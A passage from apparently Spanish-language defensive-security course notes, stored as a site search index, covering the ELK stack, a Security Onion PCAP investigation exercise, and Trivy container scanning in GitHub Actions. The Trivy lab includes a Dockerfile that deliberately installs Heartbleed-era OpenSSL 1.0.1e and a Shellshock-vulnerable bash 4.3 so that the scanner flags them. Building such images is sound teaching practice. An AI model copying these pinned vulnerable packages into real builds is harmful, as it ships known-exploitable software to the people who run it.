tomar datos de cualquier fuente, en cualquier formato, y buscar, analizar y visualizar esos datos en tiempo real.</p>"},{"location":"segdef/logs/#arquitectura-de-elk","title":"Arquitectura de ELK","text":"<p>Una arquitectura t\u00edpica de ELK:</p> <p></p>"},{"location":"segdef/logs/#que-es-elasticsearch","title":"\u00bfQu\u00e9 es Elasticsearch?","text":"<p>Elasticsearch es una base de datos NoSQL. Est\u00e1 basada en el motor de b\u00fasqueda Lucene, y est\u00e1 construida con RESTful APIS. Ofrece un despliegue sencillo, m\u00e1xima fiabilidad y f\u00e1cil gesti\u00f3n. Tambi\u00e9n ofrece consultas avanzadas para realizar an\u00e1lisis detallados y almacena todos los datos de forma centralizada. Es \u00fatil para ejecutar una b\u00fasqueda r\u00e1pida de los documentos.</p> <p>Elasticsearch tambi\u00e9n permite almacenar, buscar y analizar grandes vol\u00famenes de datos. Se utiliza sobre todo como motor subyacente para potenciar aplicaciones que completan los requisitos de b\u00fasqueda. Se ha adoptado en plataformas de motores de b\u00fasqueda para aplicaciones web y m\u00f3viles modernas. Adem\u00e1s de una b\u00fasqueda r\u00e1pida, la herramienta tambi\u00e9n ofrece an\u00e1lisis complejos y muchas funciones avanzadas.</p>"},{"location":"segdef/logs/#terminos-utilizados-en-elastic-search","title":"T\u00e9rminos utilizados en Elastic Search","text":"T\u00e9rmino Uso Cluster Un cluster es una colecci\u00f3n de nodos que juntos almacenan datos y proveen capacidades de indexaci\u00f3n y b\u00fasqueda. Nodo Un nodo es una instancia de elasticsearch. Se crea cuando se inicia una instancia de elasticsearch. \u00cdndice Un \u00edndice es una colecci\u00f3n de documentos que tienen caracter\u00edsticas similares, por ejemplo, datos de clientes, cat\u00e1logo de productos. Es muy \u00fatil cuando se realizan operaciones de indexaci\u00f3n, b\u00fasqueda, actualizaci\u00f3n y borrado. Permite definir tantos \u00edndices en un mismo cluster. Documento Es la unidad b\u00e1sica de informaci\u00f3n que se puede indexar. Se expresa en un par JSON (clave: valor). '{\"usuario\": \"nullcon\"}'. Cada Documento est\u00e1 asociado a un tipo y a un id \u00fanico. Shard Cada \u00edndice puede dividirse en varios shards para poder distribuir los datos. El shard es la parte at\u00f3mica de un \u00edndice, que se puede distribuir por el cluster si se quieren a\u00f1adir m\u00e1s nodos."},{"location":"segdef/logs/#que-es-logstash","title":"\u00bfQu\u00e9 es Logstash?","text":"<p>Logstash es la herramienta de canalizaci\u00f3n de recopilaci\u00f3n de datos. Recoge entradas de datos y las alimenta hacia Elasticsearch. Re\u00fane todo tipo de datos de diferentes fuentes y los pone a disposici\u00f3n para su uso posterior.</p> <p>Logstash puede unificar datos de fuentes dispares y normalizar los datos en los destinos deseados. Permite limpiar y democratizar todos los datos para la anal\u00edtica y la visualizaci\u00f3n de casos de uso.</p> <p>Consta de tres componentes:</p> <ul> <li>Entrada: pasar los logs para procesarlos a un formato comprensible para la m\u00e1quina.</li> <li>Filtros: Es un conjunto de condiciones para realizar una determinada acci\u00f3n o evento</li> <li>Salida: Toma de decisiones para el evento o registro procesado</li> </ul>"},{"location":"segdef/logs/#que-es-kibana","title":"\u00bfQu\u00e9 es Kibana?","text":"<p>Kibana, como coment\u00e1bamos, es un visualizador de datos que completa la pila ELK. El panel de control de Kibana ofrece varios diagramas interactivos, datos geoespaciales y gr\u00e1ficos para visualizar consultas complejas.</p> <p>Se puede utilizar para buscar, ver e interactuar con los datos almacenados en los directorios de Elasticsearch. Kibana le ayuda a realizar an\u00e1lisis de datos avanzados y visualizar sus datos en una variedad de tablas, gr\u00e1ficos y mapas.</p>"},{"location":"segdef/logs/#para-que-es-adecuado-elk","title":"\u00bfPara qu\u00e9 es adecuado ELK?","text":""},{"location":"segdef/logs/#cuando-existe-una-falta-de-consistencia","title":"Cuando existe una falta de consistencia","text":"<p>Tenemos muchos dispositivos con logs, y dentro de nuestros servidores, por ejemplo, tenemos distintos servicios funcionando y cada servicio tiene un tipo de log distinto. Los administradores de sistemas y DevOps gen\u00e9ricamente, o administradores web o desarrolladores, necesitan acceder a dichos logs para comprobarlos, para lo que hay una gran dificultad, ya que los formatos var\u00edan y son dif\u00edciles de entender.</p>"},{"location":"segdef/logs/#existen-diferentes-formatos-de-tiempo","title":"Existen diferentes formatos de tiempo","text":"<p>Cada log puede venir con un formato de tiempo distinto.</p> <p>En algunos logs se incluye la fecha, otros vienen con timestamp, otros con la hora al finalizar, etc.</p> <p>Ejemplo:</p> <pre><code>Oct 04 12:15:21, 020289 07:23:24, 150260505\n</code></pre>"},{"location":"segdef/logs/#descentralizado","title":"Descentralizado","text":"<p>Los logs se encuentran repartidos en todos los servidores que tengamos, cada servidor puede tener un tipo de log y dentro de un servidor puede haber diferentes rutas donde encontrarlos. Un administrador de sistemas, si tiene pocos servidores que administrar, puede acceder a ellos por \u201cssh + grep\u201d, pero si tiene muchos m\u00e1s, esta opci\u00f3n no es escalable.</p>"},{"location":"segdef/logs/#falta-de-conocimientos","title":"Falta de conocimientos","text":"<p>Falta de conocimientos o que no se implementan bien las pol\u00edticas. Pueden deberse a varios motivos, por ejemplo: Las personas que tienen que acceder a un log no tienen permiso para acceder al mismo, por pol\u00edticas de empresa.</p> <p>Estas personas no tienen experiencia para entender una l\u00ednea de log. Algunos logs que tienen mucha informaci\u00f3n incluida en campos y cuando la informaci\u00f3n es tanta, a veces es complicado saber a qu\u00e9 representa cada n\u00famero o cadena de texto.</p> <p>Desconocen d\u00f3nde se encuentran los logs, c\u00f3mo se actualizan, c\u00f3mo se van repartiendo, si se van borrando cada d\u00eda\u2026</p>"},{"location":"segdef/logs/#referencias","title":"Referencias","text":"<p>Elastic Stack (ELK Stack) </p> <p>ELK Stack Tutorial: What is Kibana, Logstash &amp; Elasticsearch?</p> <p>\u00bfQu\u00e9 es la pila ELK?</p> <p>\u00bfQU\u00c9 ES ELK? ElasticSearch, Logstash y Kibana</p>"},{"location":"segdef/seconion/","title":"Monitorizaci\u00f3n utilizando Security Onion","text":""},{"location":"segdef/seconion/#introduccion","title":"Introducci\u00f3n","text":"<p>Como parte de nuestra estrategia Blue Team ya hemos visto t\u00e9cnica tales como el an\u00e1lisis de logs de forma cl\u00e1sica, con herramientas como Elastic Stack, adem\u00e1s de utilidades como los IDS/IPS.</p> <p>En este caso vamos a ver una herramienta que aglutine a varias de las anteriores. Estamos hablando de Security Onion, una distribuci\u00f3n de Linux que nos permitir\u00eda f\u00e1cilmente poder montar un SOC.</p> <p></p> <p>Tal y como podemos leer en su documentaci\u00f3n:</p> <p>Quote</p> <p>Security Onion is a free and open platform for threat hunting, enterprise security monitoring, and log management. It includes our own tools for Alerts, Dashboards, Hunt, PCAP, and Cases as well as other tools such as Playbook, FleetDM, osquery, CyberChef, Elasticsearch, Logstash, Kibana, Suricata, Zeek, and Wazuh. </p> <p>Como vemos, Security Onion agrupa herramientas bien conocidas de terceros, como otras propias. De las conocidas ya hemos hablado de Suricata o ELK pero echemos un vistazo r\u00e1pido a otras:</p>"},{"location":"segdef/seconion/#zeek","title":"Zeek","text":"<p>Hasta 2018 Zeek fue conocido con el nombre de Bro. </p> <p></p> <p>Zeek es un una herramienta de c\u00f3digo abierta que realiza un an\u00e1lisis de red pasivo. Utiliza y visualiza grandes cantidades de metadatos de la red para tener una visi\u00f3n de alto nivel. Para cada flujo de t\u0155afico, los metadatos tipicos constan de una tupla de 5 par\u00e1metros: IPs, protocolo, puertos. Pero tambi\u00e9n se hacen servir atributos espec\u00edficos del tr\u00e1fico que permita a los analistas entrar m\u00e1s en detalla como informaci\u00f3n DNS, detalles del cifrado TLS o informaci\u00f3n de capa 7.</p>"},{"location":"segdef/seconion/#suricatasnort-vs-zeek","title":"Suricata/Snort vs Zeek","text":"<p>Suricata/Snort pueden o bien inspeccinar el tr\u00e1fico de forma pasiva o bloquearlo de forma. Todo ello en funci\u00f3n de unas alertas basadas en reglas.</p> <p>Zeek es un analizador de tr\u00e1fico que puede extraer informaci\u00f3n para su posterior disecci\u00f3n con el fin de investigar una sucesi\u00f3n de acontecimientos. Genera varios tios de logs (conn, http, ssl...) y provee, como ya hemos dicho, todos los detalles de las conexiones realizadas.</p>"},{"location":"segdef/seconion/#wazuh","title":"Wazuh","text":"<p>Wazuh es una plataforma gratuita y de c\u00f3digo abierto que se usa para prevenci\u00f3n de amenazas, detecci\u00f3n y respuesta. Es capaz de ofrecer protecci\u00f3n en enteorno on-premise, virtualizados, contenerizados o en cloud.</p> <p></p> <p>Wazuh consta de un agente de seguridad para un endpoint, desplegado para monitorizar los sitemas y un server de gesti\u00f3n o administraci\u00f3n, que recolecta y analiza los datos que recopila de todos los agentes. Adem\u00e1s, Wazuh tiene integraci\u00f3n completa con Elastic Stack, proporcionando un mecanismo de b\u00fasqueda y visualizaci\u00f3n que permite a los usuarios navegar a trav\u00e9s de sus alerta de seguridad.-</p> <p>Para ver en detalle las capacidades de Wazuh, pod\u00e9is consultar su GitHub.</p>"},{"location":"segdef/seconion/#cyberchef","title":"CyberChef","text":"<p>Aunque ya lo hemos usado anteriormente, la mejor forma de definir Cyberchef es acudir directamente a sus creadores:</p> <p>Quote</p> <p>A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression.</p>"},{"location":"segdef/seconion/#resto-de-herramientas-de-security-onion","title":"Resto de herramientas de Security Onion","text":"<p>La mejor forma de descubrir las herramientas que integra Security Onion es acudir directamente a su documentaci\u00f3n</p>"},{"location":"segdef/seconion/#demostracion-practica","title":"Demostraci\u00f3n pr\u00e1ctica","text":"<p>Investigaci\u00f3n de un caso de exfiltraci\u00f3n de datos haciendo uso de Security Onion.</p>"},{"location":"segdef/seconion/#ejerciciopractica","title":"Ejercicio/Pr\u00e1ctica","text":""},{"location":"segdef/seconion/#importar-archivos-pcap","title":"Importar archivos PCAP","text":"<p>Si queremos borrar las alertas generadas y las visualizaciones en ElasticSearch, ejecutaremos estas dos instrucciones:</p> <pre><code>sudo so-nsm-clear\nsudo so-elastic-clear\n</code></pre> <p>Y, tras ello, podemos importar el .pcap as\u00ed:</p> <pre><code>sudo so-import-pcap /ruta/absoluta/a/archivo.pcap\n</code></pre> <p>En principio no deber\u00eda dar ning\u00fan problema pero, si lo diera, reinicidad la m\u00e1quina. Puesto que Security Onion est\u00e1 basada en contenedores Docker para todas sus herramientas, puede que tras reiniciar tarde un rato en tenerlo todo listo. </p> <p>Pod\u00e9is comprobar el estado en el que est\u00e1n los contenedores en tiempo real con:</p> <pre><code>watch sudo so-status\n</code></pre> <p>No os preocup\u00e9is si los \u00faltimos tres contenedores os salen como <code>DISABLED</code>, eso es porque no est\u00e1 capturando en tiempo real pero los pcap si los analizar\u00e1 con Suricata y Zeek.</p>"},{"location":"segdef/seconion/#trafico-malware","title":"Tr\u00e1fico malware","text":""},{"location":"segdef/seconion/#primer-flujo-tcp","title":"PRIMER FLUJO TCP","text":"<ol> <li>\u00bfC\u00f3mo podemos ver la secuencia temporal de las alertas, de menos reciente a m\u00e1s reciente? </li> <li>Vemos un primer flujo TCP, de una IP interna hacia un host de internet, \u00bfqu\u00e9 IPs (origen y destino) y qu\u00e9 puertos (origen y destino) se ven implicados?</li> <li>Hay una alerta que nos llama la atenci\u00f3n puesto que vemos que se realiza una petici\u00f3n a un PDF pero diretamente a una direcci\u00f3n IP, en lugar de a un dominio que ser\u00eda lo m\u00e1s normal, \u00bfde qu\u00e9 alerta se trata?</li> <li>Previo a esa alerta vemos alguna otra que nos indica que se ha observado un user-agent que se identifica como curl</li> <li>\u00bfQu\u00e9 nos dice que ha ocurrido la \u00faltima alerta perteneciente a ese flujo?</li> <li>\u00bfSi cojo cualquier alerta de las pertenecientes a ese flujo TCP, c\u00f3mo puedo ver en detalle todos los mensajes...? \u00bfP...?</li> <li>\u00bfEn este flujo detallado, qu\u00e9 user-agent podemos ver?</li> <li>\u00bfSe ve algo sospechoso en el cuerpo de la respueta?</li> <li>\u00bfD\u00f3nde podemos mandar este tr\u00e1fico, haciendo uso de un sombrero de cocina, para jugar con \u00e9l?</li> <li>Una vez all\u00ed, \u00bfqu\u00e9 podemos ir quit\u00e1ndole (incluso con una varita m\u00e1gica) hasta ver algo interesante para nosotros?</li> <li>Una vez llegado al meollo del asunto, \u00bfqu\u00e9 referencias raras podemos ver?</li> </ol>"},{"location":"segdef/seconion/#segundo-flujo-tcp","title":"SEGUNDO FLUJO TCP","text":"<ol> <li>Identifica las alerta que pertenecen al siguiente flujo gracias a los n\u00fameros de puerto y las IPs</li> <li>Volvemos a mirar todo el flujo de tr\u00e1fico detallado de la misma manera que en el caso anterior</li> <li>\u00bfSe ve algo raro aqu\u00ed?</li> </ol>"},{"location":"segdef/seconion/#tercer-flujo-tcp","title":"TERCER FLUJO TCP","text":"<ol> <li>Identifica las dos alertas que identifican este flujo, as\u00ed como sus par\u00e1metros.</li> <li>Volvemos a mirar todo el flujo de tr\u00e1fico de la misma manera que en los casos anteriores</li> <li>\u00bfQu\u00e9 user-agent se est\u00e1 utilizando y qu\u00e9 acci\u00f3n realiza esta petici\u00f3n?</li> <li>Vemos que tras este flujo, hay una alerta m\u00e1s de tr\u00e1fico HTTPS, \u00bfsabr\u00edas decir a qu\u00e9 corresponde este tr\u00e1fico viendo lo que est\u00e1 ocurriendo?</li> </ol>"},{"location":"segdef/seconion/#cuarto-flujo-tcp","title":"CUARTO FLUJO TCP","text":"<ol> <li>Ahora aparecen un gran n\u00famero de alertas avisando de varias cosas, \u00bfqu\u00e9 tiene pinta de haber ocurrido?</li> <li>\u00bfC\u00f3mo puedes mirar detalladamente que ha ocurrido a partir de las alertas?</li> <li>\u00bfQu\u00e9 vemos en esta vista detallada?</li> </ol> <p>Note</p> <p>Esto es un breve vistazo a las alertas que hemos generado pero, por normal general, querremos saber c\u00f3mo lidiar con incidentes as\u00ed cuando demos con atacantes m\u00e1s sofisticados que sean capaces de evadir nuestras firmas, veamos c\u00f3mo.</p> <ol> <li>Pesta\u00f1a <code>Hunt</code></li> <li>Utilizamos una query predefinida que ordene por evento m\u00f3dulo y evento dataset</li> <li>En Group Metrics, \u00bfqu\u00e9 clase de logs vemos que ha recopilado Zeek?</li> <li>En el men\u00fa desplegable de las querys, elegir que nos muestre todas las conexiones por ip origen, ip destino, protocolo de red y puerto destino.</li> <li>Agrupad ahora en ese mismo desplegable por conexiones HTTP y puerto destino.</li> <li>\u00bfAparece en Group Metrics alg\u00fan puerto que no sea el usual de HTTP?</li> <li>Si aparece --&gt; Include</li> <li>\u00bfAparece algo digno de echarle un vistazo en Events? Miradlo de forma detallada como ya sab\u00e9is.</li> <li>\u00bfQu\u00e9 tenemos aqu\u00ed?</li> </ol>"},{"location":"segdef/seconion/#otras-formas-de-deteccion","title":"OTRAS FORMAS DE DETECCI\u00d3N","text":"<ol> <li>Agrupar en la query por conexiones HTTP, por m\u00e9todo http y por user-agent.</li> <li>\u00bfQu\u00e9 cosa interesante se ve aqu\u00ed que podr\u00eda servirnos para identificar tambi\u00e9n el tr\u00e1fico malicioso?</li> <li>Agrupa ahora por conexiones HTTP  por virtual host.</li> <li>\u00bfHay algo que te llame la atenci\u00f3n por raro y qu\u00e9 pueda ponernos sobre la pista de tr\u00e1fico malicioso?</li> <li>Agrupa ahora por dataset notice (Zeek).</li> <li>\u00bfQu\u00e9 cosa sospechosa se ve?</li> <li>En Events, agrupa por el campo <code>notice.sub_message</code></li> <li>\u00bfDe qu\u00e9 entidad son la mayor\u00eda de los certificados?\u00bfQu\u00e9 conclusi\u00f3n extraes?</li> </ol> <p>Tarea</p> <p>Documenta esta pr\u00e1ctica con todas las explicaciones y capturas de pantalla pertinentes. Adem\u00e1s, incluye una conclusi\u00f3n personal de todo este proceso al final del informe de la pr\u00e1ctica.</p>"},{"location":"segdef/trivy/","title":"An\u00e1lisis de vulnerabilidades en contenedores con Trivy","text":""},{"location":"segdef/trivy/#introduccion","title":"Introducci\u00f3n","text":"<p>A medida que las aplicaciones cada vez m\u00e1s van cambiando su infraestructura a una basada en contenedores, m\u00e1s se va haciendo evidente que hay que auditar estos contenedores en b\u00fasqueda de vulnerabilidades.</p> <p>En esta secci\u00f3n usaremos Trivy para auditar im\u00e1genes de contenedores y, adem\u00e1s, veremos como integrar Trivy con Github Actions para que se produzca un escaneo autom\u00e1tico de la imagen cada vez que esta se construya. Adem\u00e1s, gracias a ello, veremos c\u00f3mo prevenir que im\u00e1genes vulnerables pasen a producci\u00f3n.</p>"},{"location":"segdef/trivy/#que-es-trivy","title":"\u00bfQu\u00e9 es Trivy?","text":"<p>Trivi es un sencillo, r\u00e1pido y completo esc\u00e1ner de vulnerabilidades para contenedores, muy adecuado para la integraci\u00f3n continua y DevSecOps. Esta herramienta detecta vulnerabilidades en los paquetes de los sistemas operativos, sea \u00e9ste Alpine, RHEL, Debian, Ubuntu, Amazon Linux o lo que proceda, adem\u00e1s de en dependencias de aplicaciones (Node, Ruby, Python, Java...).</p> <p>Debido a la rapidez de Trivy, podemos integrarlo f\u00e1cilmente de forma directa en nuestros workflows de desarrollo. Dicho de otro modo, en cu\u00e1nto un desarrollador actualice el c\u00f3digo, \u00e9ste puede ser escaneado en tiempo real en b\u00fasqueda de vulnerabilidades.</p> <p></p>"},{"location":"segdef/trivy/#nist-csf-y-trivy","title":"NIST CSF y Trivy","text":"<p>Este framework consta de tres componentes principales, el Core, los niveles de implementaci\u00f3n (Tiers) y los Perfiles. El core, que es lo que se muestra en la siguiente imagen, contiene las mejores pr\u00e1cticas a alto nivel para ciberseguridad y manejo del riesgo, en general.</p> <p></p> <p>Trivy se centra en las funciones de identificaci\u00f3n y protecci\u00f3n, principalmente. Adem\u00e1s, este framework define categor\u00edas para cada funci\u00f3n y Trivy de nuevo se centra en dos de ellas, manejo del riesgo y procesos y proedimientos para la protecci\u00f3n de la informaci\u00f3n.</p> <p>As\u00ed las cosas, Trivy nos ayudar\u00e1 a identificar y documentar las vulnerabilidades de nuestros activos (contenedores) y, mediante su integraci\u00f3n con Github Actions, podremos controlar los controles de cambios:</p> <p></p>"},{"location":"segdef/trivy/#demostracion-1","title":"Demostraci\u00f3n 1","text":"<p>Info</p> <p>Esta demostraci\u00f3n ha sido realizada con Debian 11 Bullseye y se ha comprobado que funciona correctamente.</p> <p>Prerrequisitos necesarios:</p> <ul> <li>Cuenta en GitHub</li> <li>Personal Access Token creado en GitHub</li> <li>Cuenta en DockerHub</li> <li>Personal Access Token creado en DockerHub</li> </ul> <p>Para esta demostraci\u00f3n el primer paso es, como cab\u00eda esperar, instalar Trivy. Para ello:</p> <ol> <li> <p>Deb\u00e9is hacer un fork del repositorio: <code>https://github.com/raul-profesor/practica-de-trivy</code> y luego clonarlo en vuestra m\u00e1quina virtual</p> </li> <li> <p>Si echamos un ojo al script <code>install.sh</code> vemos que:</p> <ol> <li>Obtiene el nombre de la distribuci\u00f3n</li> <li>Instala Trivy y las dependencias necesarias</li> <li>Tambi\u00e9n instala <code>container-diff</code> para inspeccionar y detectar im\u00e1genes que hayan sido manipuladas </li> <li>Se instala Docker en caso de que sea necesario porque no est\u00e9 instalado ya</li> </ol> </li> <li>Ejecutamos el script de instalaci\u00f3n y comprobamos que Trivy se ha instalado correctamente</li> </ol> <p>Comencemos pues con la demo propiamente dicha. Podemos ver que Trivy tiene multitud de opciones, como escaneo de im\u00e1genes, de sistema de archivos local, repositorio remoto...:</p> <p><pre><code>$ trivy --help\n</code></pre> No obstante, en nuestro caso nos centraremos \u00fanicamente en el escaneo de im\u00e1genes Docker. Escaneemos una imagen de Docker Hub a modo de ejemplo:</p> <pre><code>$ trivy image zachroofsec/trivy-tutorial1\n</code></pre> <ul> <li> <p>En primer lugar vemos que Tivy se queja de que estamos usando el tag <code>latest</code>. Para nuestros prop\u00f3sitos no hay problema alguno puesto que no estamos cambiando nada de las capas subyacentes de la imagen, m\u00e1s adelante ya nos preocuparemos de esto.</p> </li> <li> <p>Vemos que Trivy nos informa de m\u00e1s de 400 vulnerabilidades en el momento en que se escriben estos apuntes. De locos. Inabarcable.</p> <p></p> </li> </ul> <p>Tarea</p> <p>Explorar en la ayuda de Trivy los flags que se pueden usar en la l\u00ednea de comandos para escanear im\u00e1genes:</p> <p><pre><code>$ trivy image --help\n</code></pre> Y realizar un escaneo m\u00e1s sensato y priorizando vulnerabilidades. Esto incluye que se reporten \u00fanicamente las vulnerabilidades CRITICAL y HIGH, as\u00ed como que se ignoren aquellas que no tengan una soluci\u00f3n conocida. Comprueba c\u00f3mo se reduce dr\u00e1sticamente el n\u00famero de vulnerabilidades mostradas.</p> <p>Info</p> <p>La severidad que muestra Trivy para las vulnerabilidades puede venir de distintos sitios. Se puede obtener de la NVD (National Vulnerability Database) o directamente del vendor o fabricante.  Por ejemplo, para un paquete de Ubuntu, Trivy aprovehcar\u00e1 el reporte de vulnerabilidades que haya publicado la propia Canonical y favorecer\u00e1 esta severidad respecto a la de la NVD.</p> <p>Vemos que la mayor\u00eda de los CRITICAL y HIGH se los llevan algunas librer\u00edas de OpenSSL, incluyendo el famoso Heartbleed que permite que un usuario malicioso no autenticado pueda, en ciertos casos, leer la memoria de la m\u00e1quina.</p> <p>En definitiva y para terminar, podemos decir que hemos utilizado Trivy para llevar a cabo una estrategia reactiva puesto que mediante ella detectamos las vulnerabilidades a posteriori, teniendo que solucionarlas una vez est\u00e1n ya en producci\u00f3n. Veremos en la pr\u00f3xima demostroaci\u00f3n como podemos adoptar una estrategia m\u00e1s preventiva con el fin de evitar que estos problemas lleguen ni siquiera a publicarse.</p>"},{"location":"segdef/trivy/#demostracion-2","title":"Demostraci\u00f3n 2","text":""},{"location":"segdef/trivy/#que-es-github-actions","title":"\u00bfQu\u00e9 es Github actions?","text":"<p>GitHub Actions es una plataforma de integraci\u00f3n y despliegue continuos (CI/CD) que te permite automatizar tu mapa de compilaci\u00f3n, pruebas y despliegue. Puedes crear flujos de trabajo (workflows) y crear y probar cada solicitud de cambios en tu repositorio o desplegar solicitudes de cambios fusionadas a producci\u00f3n.</p> <p>GitHub Actions va m\u00e1s all\u00e1 de solo DevOps y te permite ejecutar flujos de trabajo cuando otros eventos suceden en tu repositorio. Por ejemplo, puedes ejecutar un flujo de trabajo para que agregue autom\u00e1ticamente las etiquetas adecuadas cada que alguien cree una propuesta nueva en tu repositorio.</p> <p>GitHub proporciona m\u00e1quinas virtuales Linux, Windows y macOS para que ejecutes tus flujos de trabajo o puedes hospedar tus propios ejecutores auto-hospedados en tu propio centro de datos o infraestructura en la nube.</p> <p>Un workflow ejecutar\u00e1 uno o m\u00e1s jobs y se definen mediante un archivo YAML. Estos archivos se ubican en el directorio <code>.github/workflows</code> de un repositorio y puede haber varios archivos de workflow para diferentes cometidos.</p> <p>Un evento es una actividad que dispara un flujo de trabajo o workflow. Estos eventos pueden ser un push, un pull request o un merge.</p> <p>Por \u00faltimo, los jobs son acciones o pasos que se ejecutan dentro de un workflow.</p> <p>Una acci\u00f3n es una aplicaci\u00f3n personalizada para la plataforma de GitHub Actions que realiza una tarea compleja pero que se repite frecuentemente</p> <p>Para entender detalladamente todos los componentes, pod\u00e9is consultar aqu\u00ed.</p>"},{"location":"segdef/trivy/#manos-a-la-obra","title":"Manos a la obra","text":"<p>En esta ocasi\u00f3n vamos a utilizar un enfoque proactivo para la integraci\u00f3n de Trivy en el proceso de revisi\u00f3n de c\u00f3digo mediante el uso de GitHub Actions.</p> <p>B\u00e1sicamente, lo que vamos a hacer con GitHub Actions es crear un Ubuntu Server que estar\u00e1 hospedado en la infraestructura de GitHub y podremos usarlo para auditar los cambios antes de subir la imagen al Docker Registry. Es m\u00e1s, podemos examinar el resultado del escaneo de Trivy e incluirlo en un Pull Request, permitiendo que se produzca una discusi\u00f3n antes de incorporar los cambios.</p> <p> </p> <p>En primer lugar, deb\u00e9is hacer un fork en vuestra cuenta del repositorio, \u00fanicamente de la rama main.</p> <p><code>https://https://github.com/raul-profesor/practica-de-trivy</code></p> <p>Y tras ello, en el terminal, os deb\u00e9is clonar el repositorio que utilizaremos como referencia:</p> <pre><code>$ git clone https://github.com/nombre-usuario/practica-de-trivy\n</code></pre> <p>Y como medida de seguridad, protegeremos la \u00fanica rama que tenemos ahora mismo (main). Para ello bien hac\u00e9is click en el propio aviso que os aparece en el repositorio al entrar v\u00eda web:</p> <p></p> <p>O bien v\u00e1is directamente a <code>Settings</code>:</p> <p></p> <p>Y marc\u00e1is lo que aparece en la imagen, que b\u00e1sicamente viene a decir que antes de hacer un merge, se requiere un pull request y adem\u00e1s, aprobaci\u00f3n del mismo. Tambi\u00e9n se requiere que pase los status check (nuestras acciones de Github Actions) antes de poder hacer un merge</p> <p>Supongamos ahora que somos un desarrollador con el prop\u00f3sito de realizar o proponer cambios en nuestro Dockerfile. En primer lugar, nos crearemos la rama updates para realizar los cambios con los que luego haremos el merge a la rama principal:</p> <pre><code>$ git checkout -b updates\n</code></pre> <p>\u00a1Atenci\u00f3n!</p> <p>Es muy probable que en el repositorio del que hab\u00e9is hecho fork os aparezca el archivo <code>image_sha.txt</code> dentro del directorio <code>docker-builder/registry-repos/trivy-tutorial</code>. Deb\u00e9is eliminarlo antes de empezar la demo/pr\u00e1ctica para que os funcione correctamente.</p> <p>Ahora, dentro de nuestro Dockerfile, realizaremos algunos cambios. En primer lugar, a\u00f1adiremos algunos <code>apt-get installs</code>, como por ejemplo Apache, wget y build-essential. Tambi\u00e9n instalaremos una versi\u00f3n de libSSL. As\u00ed pues, editamos el archivo:</p> <pre><code>$ nano docker-builder/registry-repos/trivy-tutorial/Dockerfile\n</code></pre> <p>Y descomentamos las l\u00edneas resaltadas:</p> <p><pre><code>FROM debian\n\nENV DEBIAN_FRONTEND noninteractive\n\n# +---------------------------------------------------------+\n# INSTALACI\u00d3N A NIVEL DE SISTEMA MEDIANTE GESTOR DE PAQUETES\n# +---------------------------------------------------------+\n\nRUN apt-get update -y &amp;&amp;\\\napt-get dist-upgrade -y &amp;&amp;\\\n#    apt-get install -y apache2 \\\n#        wget \\\n#       libncursesw5-dev libssl-dev &amp;&amp;\\\n#        libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev &amp;&amp;\\\n#         python3-pip\\\n#        build-essential &amp;&amp;\\\napt-get autoremove &amp;&amp;\\\napt-get clean &amp;&amp;\\\nrm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/libssl1.0.0_1.0.1e-2_amd64.deb -O /tmp/libssl1.0.0_1.0.1e-2_amd64.deb &amp;&amp; \\\n#    dpkg -i /tmp/libssl1.0.0_1.0.1e-2_amd64.deb\n#\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/openssl_1.0.1e-2_amd64.deb -O /tmp/openssl_1.0.1e-2_amd64.deb &amp;&amp;\\\n#    dpkg -i /tmp/openssl_1.0.1e-2_amd64.deb\n# +--------------------+\n# INSTLACI\u00d3N CON MAKE (Shellshock)\n# (instalaci\u00f3in a nivel de sistema SIN gestor de paquetes)\n# +--------------------+\n\n#RUN wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz &amp;&amp; \\\n#    tar zxvf bash-4.3.tar.gz &amp;&amp; \\\n#    cd bash-4.3 &amp;&amp; \\\n#    ./configure &amp;&amp; \\\n#    make &amp;&amp; \\\n#    make install\n\n# +------------------------------------------------------------------------+\n# INSTALACI\u00d3N A NIVEL DE APLICACI\u00d3N MEDIANTE GESTOR DE PAQUETES (regex DoS)\n# +------------------------------------------------------------------------+\n\n#COPY lang_dependencies/Pipfile.lock /app/Pipfile.lock\n</code></pre> Y una vez hecho esto, haremos el commit y el push  correspondientes en nuestra nueva rama:</p> <pre><code>git commit -am \"Dockerfile actualizado\" &amp;&amp; git push origin updates\n</code></pre> <p>Tras ello, en el sitio web, crearemos un nuevo Pull Request:</p> <p></p> <p>\u00a1Ojo cuidao!</p> <p>Asegur\u00e1os de que el pull request lo hace\u00eds desde la rama <code>updates</code> de vuestro repositorio a la rama <code>main</code>de vuestro repositorio, como v\u00e9is en la imagen de abajo.-</p> <p></p> <p>Comparar\u00e1 los cambios realizados e informar\u00e1 de que todo est\u00e1 bien y se puede hacer merge autom\u00e1ticamente de ambas ramas. </p> <p></p> <p>Acto seguido veremos c\u00f3mo est\u00e1 pasando el check requerido, que no es m\u00e1s que la acci\u00f3n definidia en GitHub Actions para que escanee la imagen Docker creada.</p> <p>Tambi\u00e9n nos informa de que el merge est\u00e1 bloqueado puesto que requiere de aprobaci\u00f3n expl\u00edcita. Esto es debido a las protecciones de rama que hemos configurado anteriormente.</p> <p></p> <p>En la pesta\u00f1a <code>Checks</code> podemos ver que se van ejecutando, una tras otra, todas las acciones definidias y comprobamos que, tras instalar Trivy en la m\u00e1quina virtual de la infraestructura de GitHub, est\u00e1 ejecutando el escaneo de vulnerabilidades pertinente:</p> <p></p> <p>Y tras unos segundos, se produce un fallo debido a que se han encontrado vulnerabilidades (las mismas que en el escaneo local que vimos al principio):</p> <p></p> <p>Tal y como vimos anteriormente, ahora podr\u00edamos ver el resultado de Trivy en la salida de nuestro check y comprobar que el problema que desencadena las vulnerabilidades es la inclusi\u00f3n de la librer\u00eda <code>libSSL</code> vulnerable. Podemos ver tambi\u00e9n que la versi\u00f3n que da problemas coincide justo con la que nosotros instalamos en nuesro Dockerfile.</p> <p>Gracias a este <code>status check</code> que conforma el escaneo de Trivy, podemos prevenir que publiquemos en nuestro entorno im\u00e1genes de Docker vulnerables. Aunque un revisor aprobase el merge, \u00e9ste no se producir\u00eda por haber fallado el <code>status check</code>.</p> <p>Hemos visto en una imagen m\u00e1s arriba que, puesto que soy administrador del repositorio, me permite sobreescribir esta regla 